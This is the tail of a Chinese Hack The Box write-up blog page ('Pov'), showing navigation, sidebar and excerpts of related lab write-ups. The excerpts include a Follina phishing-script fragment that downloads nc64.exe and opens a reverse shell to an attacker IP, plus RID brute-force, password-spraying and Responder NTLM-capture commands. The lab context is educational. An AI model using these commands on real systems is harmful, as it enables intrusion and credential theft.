src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/23/HTB-M-SolarLab/" title="HTB-M-SolarLab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">HTB-M-SolarLab</div></div><div class="info-2"><div class="info-item-1">HTB-M-SolarLab 账户名的模糊猜测 PeportLab的CVE复现 Openfire脚本中提取账号密码  扫一扫  试探smb 可以用来打RID  1netexec smb 10.10.11.16 -u guest -p &#x27;&#x27; --rid-brute  然后就是  下载xlsx文件  1netexec smb solarlab.htb -u u.txt -p...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Outdated/" title="HTB-M-Outdated"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">HTB-M-Outdated</div></div><div class="info-2"><div class="info-item-1">HTB-M-Outdated讲的是一个CVE的钓鱼，还有一个WSUS的提权+AddKeyCredentialLink的横移  扫端口， smb匿名登录存在文件泄露pdf文件中存在在邮箱账户，以及几个CVE需要修补的 然后利用 存在RID但是我没有进行后续的信息收集，钓鱼攻击CVE-2022-30190编写脚本12345678910111213141516171819202122#!/usr/bin/env python3import base64import randomimport stringimport sysif len(sys.argv) &gt; 1:    command = sys.argv[1]else:    command = &quot;IWR http://10.10.16.14/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.16.14 443 -e cmd&quot;base64_payload =...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/05/23/HTB-M-Escape/" title="HTB-M-Escape"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Escape</div></div><div class="info-2"><div class="info-item-1">HTB-M-Escape讲的是ADCS-ESC1+MSSQL数据库引起的ntlm窃取+smb信息泄露 信息收集dns没搜集到有用信息 1dig any sequel.htb   smb试试存在RID,收集用户信息作为保存  smb空密码连接有文件  pdf里有个数据库的账户密码，还有几个内部人员姓名  进入数据库查询一下 1SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &#x27;spt_fallback_db&#x27;;  1SELECT TOP 10 * FROM spt_fallback_db;  没查询到有用信息，也没权限命令执行，于是采用中间人攻击 在开启python3 Responder.py -I tun0 然后用数据库 读取我主机的共享文件 1EXEC xp_dirtree &#x27;\\10.10.16.14\share&#x27;, 1,...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Jab/" title="HTB-M-Jab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Jab</div></div><div class="info-2"><div class="info-item-1">HTB-Jab扫描端口服务利用 XMPP - 5269, 5270（tcp下载客户端 XMPP 是一个“通用消息标准”。它允许“XMPP 兼容的软件加入 XMPP 消息网络”  先创建，新建一个用户，使用，在利用插件Service Discovery 来进行那个信息收集 可以看到还有三个子域名 然后点击list的用户的查找用户这，顺便开启插件控制台 123456789&lt;iq type=&#x27;set&#x27;     from=&#x27;ddl1@jab.htb&#x27;    to=&#x27;search.jab.htb&#x27;    id=&#x27;search4users&#x27;    xml:lang=&#x27;en&#x27;&gt;	&lt;query xmlns=&#x27;jabber:iq:search&#x27;&gt;       ...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Manager/" title="HTB-M-Manager"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Manager</div></div><div class="info-2"><div class="info-item-1">HTB-M-Manager RID攻击 ADCS提权  扫扫先扫一波，有web服务就去看看 测试一下功能点 貌似没xss 扫扫ldap端口,没有连接不让扫  扫扫smb  这种需要身份验证，但是假用户也能得到部分验证 可以尝试 RID 循环攻击1impacket-lookupsid dll@manager.htb -no-pass  输出中 : 前的数字是 RID 直接提取用户 1| grep SidTypeUser | cut -d&#x27; &#x27; -f2 | cut -d&#x27;\&#x27; -f2 | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27; | tee users  可以以使用netexec1netexec smb 10.10.11.236 -u guest -p &#x27;&#x27; --rid-brute  之后测试一下那个有没有用户名账号密码一样的 1netexec smb manager.htb -u users -p users --continue-on-success...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Outdated/" title="HTB-M-Outdated"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Outdated</div></div><div class="info-2"><div class="info-item-1">HTB-M-Outdated讲的是一个CVE的钓鱼，还有一个WSUS的提权+AddKeyCredentialLink的横移  扫端口， smb匿名登录存在文件泄露pdf文件中存在在邮箱账户，以及几个CVE需要修补的 然后利用 存在RID但是我没有进行后续的信息收集，钓鱼攻击CVE-2022-30190编写脚本12345678910111213141516171819202122#!/usr/bin/env python3import base64import randomimport stringimport sysif len(sys.argv) &gt; 1:    command = sys.argv[1]else:    command = &quot;IWR http://10.10.16.14/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.16.14 443 -e cmd&quot;base64_payload =...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-SolarLab/" title="HTB-M-SolarLab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-SolarLab</div></div><div class="info-2"><div class="info-item-1">HTB-M-SolarLab 账户名的模糊猜测 PeportLab的CVE复现 Openfire脚本中提取账号密码  扫一扫  试探smb 可以用来打RID  1netexec smb 10.10.11.16 -u guest -p &#x27;&#x27; --rid-brute  然后就是  下载xlsx文件  1netexec smb solarlab.htb -u u.txt -p...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-H-Blazorized/" title="HTB-H-Blazorized"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-H-Blazorized</div></div><div class="info-2"><div class="info-item-1">HTB-Blazorized提出疑问 js抓取然后获得dll这边的手法我这残缺，我正常bp抓包的没有抓取到这个dll的调用 jwt这个参数说是用Blazor Traffic Processor工具来分析这个raw，这个raw我翻遍了我的bp我也没有找到  正常步骤 显示爆破了一下子域名，出admin,然后↓这个出现api子域名的调用，写入hosts  广告然后再点击一下check，浏览了一下发现有不错的广告资料，copy一份 Title: Active Directory Below are links to projects and posts relating AD...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-M-Pov"><span class="toc-number">1.</span> <span class="toc-text">HTB-M-Pov</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.0.1.</span> <span class="toc-text">子域名爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">传文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83SeDebugPrivilege"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权SeDebugPrivilege</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">法二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-SolarLab/" title="HTB-M-SolarLab">HTB-M-SolarLab</a><time datetime="2025-05-23T12:58:09.000Z" title="Created 2025-05-23 20:58:09">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Pov/" title="HTB-M-Pov">HTB-M-Pov</a><time datetime="2025-05-23T12:57:57.000Z" title="Created 2025-05-23 20:57:57">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Outdated/" title="HTB-M-Outdated">HTB-M-Outdated</a><time datetime="2025-05-23T12:55:16.000Z" title="Created 2025-05-23 20:55:16">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Manager/" title="HTB-M-Manager">HTB-M-Manager</a><time datetime="2025-05-23T12:55:03.000Z" title="Created 2025-05-23 20:55:03">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Jab/" title="HTB-M-Jab">HTB-M-Jab</a><time datetime="2025-05-23T12:54:38.000Z" title="Created 2025-05-23 20:54:38">2025-05-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
